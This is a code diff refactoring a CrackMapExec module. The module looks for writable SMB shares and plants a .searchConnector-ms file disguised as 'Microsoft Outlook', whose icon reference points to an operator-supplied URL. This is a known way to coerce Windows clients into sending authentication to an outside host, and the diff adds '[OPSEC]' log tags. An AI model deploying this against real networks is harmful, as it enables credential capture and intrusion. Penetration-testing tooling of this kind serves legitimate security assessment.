@@ -43,21 +43,20 @@ class CMEModule:
         if "FILENAME" in module_options:
             self.filename = str(module_options["FILENAME"])
 
-        self.file_path = ntpath.join(
-            "\\", "{}.searchConnector-ms".format(self.filename)
-        )
+        self.file_path = ntpath.join("\\", f"{self.filename}.searchConnector-ms")
         if not self.cleanup:
-            self.scfile_path = "/tmp/{}.searchConnector-ms".format(self.filename)
+            self.scfile_path = f"/tmp/{self.filename}.searchConnector-ms"
             scfile = open(self.scfile_path, "w")
             scfile.truncate(0)
             scfile.write('<?xml version="1.0" encoding="UTF-8"?>')
             scfile.write(
-                '<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">'
+                "<searchConnectorDescription"
+                ' xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">'
             )
             scfile.write("<description>Microsoft Outlook</description>")
             scfile.write("<isSearchOnlyItem>false</isSearchOnlyItem>")
             scfile.write("<includeInStartMenuScope>true</includeInStartMenuScope>")
-            scfile.write("<iconReference>{}/0001.ico</iconReference>".format(self.url))
+            scfile.write(f"<iconReference>{self.url}/0001.ico</iconReference>")
             scfile.write("<templateInfo>")
             scfile.write(
                 "<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>"
@@ -72,12 +71,13 @@ class CMEModule:
     def on_login(self, context, connection):
         shares = connection.shares()
         for share in shares:
+            context.log.debug(f"Share: {share}")
             if "WRITE" in share["access"] and (
                 share["name"] == self.sharename
                 if self.sharename != ""
                 else share["name"] not in ["C$", "ADMIN$"]
             ):
-                context.log.success("Found writable share: {}".format(share["name"]))
+                context.log.success(f"Found writable share: {share['name']}")
                 if not self.cleanup:
                     with open(self.scfile_path, "rb") as scfile:
                         try:
@@ -85,27 +85,24 @@ class CMEModule:
                                 share["name"], self.file_path, scfile.read
                             )
                             context.log.success(
-                                "Created {}.searchConnector-ms file on the {} share".format(
-                                    self.filename, share["name"]
-                                )
+                                f"[OPSEC] Created {self.filename}.searchConnector-ms"
+                                f" file on the {share['name']} share"
                             )
                         except Exception as e:
+                            context.log.exception(e)
                             context.log.fail(
-                                "Error writing {}.searchConnector-ms file on the {} share: {}".format(
-                                    self.filename, share["name"], e
-                                )
+                                f"Error writing {self.filename}.searchConnector-ms file"
+                                f" on the {share['name']} share: {e}"
                             )
                 else:
                     try:
                         connection.conn.deleteFile(share["name"], self.file_path)
                         context.log.success(
-                            "Deleted {}.searchConnector-ms file on the {} share".format(
-                                self.filename, share["name"]
-                            )
+                            f"Deleted {self.filename}.searchConnector-ms file on the"
+                            f" {share['name']} share"
                         )
                     except Exception as e:
                         context.log.fail(
-                            "Error deleting {}.searchConnector-ms file on share {}: {}".format(
-                                self.filename, share["name"], e
-                            )
+                            f"[OPSEC] Error deleting {self.filename}.searchConnector-ms"
+                            f" file on share {share['name']}: {e}"
                         )
